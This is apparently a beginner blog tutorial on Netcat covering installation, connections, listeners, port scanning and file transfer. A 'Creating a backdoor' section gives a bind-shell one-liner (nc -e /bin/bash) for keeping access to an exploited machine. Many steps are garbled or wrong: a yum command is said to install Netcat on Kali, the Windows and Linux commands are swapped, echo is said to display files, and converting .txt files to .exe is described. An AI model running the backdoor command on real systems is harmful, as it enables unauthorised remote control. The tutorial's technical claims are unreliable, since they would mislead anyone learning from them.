### Introduction
Netcat is a network analysis tool developed for security specialists and hackers to analyze a network in traffic.

It is considered a `swiss-army knife` in information technology due to its limitless opportunities like the ability to create almost any kind of network connection.

At its early stages, netcat was developed to open up UDP/TCP connections between two machines from any desired port.

Over time, it has been improved and now it is used for port scanning, port forwarding, file transfer, and also remote administration. This article will help us understand how Netcat performs these operations.

Netcat can further be used as a back-end device that can be used or driven by other programs or scripts.

It is also a must-have tool for pen-tester since it is essential for network debugging and investigation.

### Goals
In this tutorial, we will mainly focus on the following:
- [Executing general Netcat commands](#executing-commands-on-netcat)
- [Modes of running Netcat](#modes-of-running-netcat)
- [Uses of Netcat](#uses-of-netcat)

### Installing Netcat
First before we start playing around with Netcat, lets make sure it is installed in your computer or working machine. It is usualy pre-installed in Kali Linux but if that is not the case in your machine, we are going to learn how to install Netcat.

1. Open your bash terminal by simultaneously holding `ctrl`+`alt`+`T` buttons.
2. Make sure you have an internet connection.
3. Run the command below to install Netcat.
  ```
    yum update -y
  ```
  This command will install Netcat on your Kali Linux.
  
4. To confirm if the installation was succesful, we can scan google to see if we can reach it. For the case we have checked the version of Netcat and connection of googl on port 8080
```
  nc -vz google.com 8080
```

### Executing commands on Netcat
Netcat is only available in the command-line interface. You can access Netcat on the `command line` on Windows and `bash terminal` on Linux.

Below is the common Netcat command syntax:

```bash
nc [options][target_ip address][port]
```

Now, let's discuss some actions that can be executed via Netcat.

#### 1. Help
To start with, you might want to know the commands you will interact with in your Netcat journey. Run the `nc -help` or `nc -h` command to list all the commands available in Netcat as shown below.

![Help Command Output](/engineering-education/introduction-to-netcat/help.png)

#### 2. Connecting Server
To achieve this, you have to access a port where a particular service is running and execute the code linking it with the Netcat commands.

The syntax is as shown below.

```bash
nc [IP Address] [Port Number] # for both the target machine.
```

Example:

```bash
nc 192.168.234.128 8080
```

In the example above, we have connected the internet accessing service via port number `8080` with the IP address `192.168.234.128`.

#### 3. Connecting two machines
To do this, we will have to set one device as the **Initiator** and the other device as the **Listener**. In our case, we will use Kali Linux as the initiator and the Windows machine as the listener.

**Creating the listener** - First, let's create the listening Machine which in our case is Windows 10. To successfully do so, run the following Netcat command:

```bash
nc -lvp 4444
```

In the command above:

- `l` - Setting up listening mode.
- `v` - Setting verbose.
- `p` - Setting up port number.

**Creating the initiator** - Creating the initiator is simple as you only need to run the IP address of the listening machine followed by the port number.

See the example is as shown below.

```bash
nc 192.168.234.128 8080
```

#### 4. Creating a backdoor
After getting a Meterpreter shell back or successfully exploiting a device, you might need to maintain your access so you can get back to the target device at any time. With Netcat, you can run a one-line command to achieve this. This is called creating a backdoor.

For Windows, use: `nc -l -p 21 -e /bin/bash`

For Linux use: `nc -l -p 21 -e hack.exe`

#### 5. Saving output
Information gathering is one of the most important fundamentals in penetration testing. To save the information gathered as the output from Netcat, we will use the parameter `-o` followed by the location to save the output as shown below.

```bash
nc 192.168.234.128 8080 -v -o /Desktop/Output.txt
```

### Modes of running Netcat
We have two common modes of running Netcat:

1. **Client mode/ initiator mode**

As we discussed earlier, the client or initiator mode always starts the connection to the listener.

2. **Listener Mode**

To set up the listener, we need the `port` number. The command also contains the `listening` and `verbose` commands.

### Uses of Netcat
1. **Port Scanning**

For every hacker or penetration tester, before performing any attack, you need to spot weak links or vulnerabilities in a target system. There are several ways to achieve this and one of them is `port scanning`.

Port scanning is the act of running a network analysis on a system to determine open or closed ports on a specific target machine.

This can be done by specifying the IP address of the target machine and setting up some parameters as shown in the syntax below.

```bash
nc -v -w2 -z [target_ip] 20-40
```

From the example above, the parameters are set to perform the following actions.

- `v` - **Verbose** means to give detailed information about the port being scanned.
- `z` - Prevents sending data to any TCP thus enabling fast scanning of ports.
- `i` - It inserts a delay between each port probe to limit scanning speed.

Even though Netcat can be used for Port scanning, it is however not the top-ranked tool for port scanning. The recommended tool is [NMAP](https://www.section.io/engineering-education/nmap-network-scanner/).

2. **Data/ File transfer**

After successfully exploiting a target machine and you have control over it, you may need Netcat for the post-exploitation phase. This is where you remotely run commands on the target machine using your local machine.

In some cases, you may want to transfer files or some data into the local machine which is mostly a Kali Linux machine since it is the recommended OS for penetrating testing.

To learn more about Kali Linux, go through [this article](https://www.section.io/engineering-education/getting-started-with-kali-linux/).

The example below explains how to transfer files using Netcat.

Let's take a sample text file named `test.txt` which in this case is in our targets device storage. To transfer the file into our local machine, run the Netcat command below on the target device either remotely or physically.

This is to purposefully set up a listener on the target device.

```bash
nc –l –p 21 >test.txt
```

In the command above, we have specified the port number 21 by preceding the `-p` command which is used to initialize the port number.

We have also set up the machine to the listening mode by using the `-l` command.

After successfully setting up a listener, we can therefore set up an initiator on our local machine by running the following command.

```bash
nc destination 21 <test.txt
```

By now, you may have noticed that we have set up client mode to connect to any listener open on port 21. We have to state the `destination` of our initiator by providing the listening port number and the name of the file to transfer.

To show the output of what is contained in the file, run the `type` command on Windows and the `echo` command on Kali Linux.

```bash
type test.txt
```

For Kali Linux, you will have to convert the `.txt` file to executable format `.exe` since Kali Linux cannot run Windows files with the `.txt` extension.

```bash
echo test.exe
```

### Conclusion
From what we have learned, we can agree that Netcat is a must-have tool for a penetration tester. It is easy to learn and allows execution of a wide range of actions as mentioned in this tutorial. Netcat is therefore recommended for penetration testing.
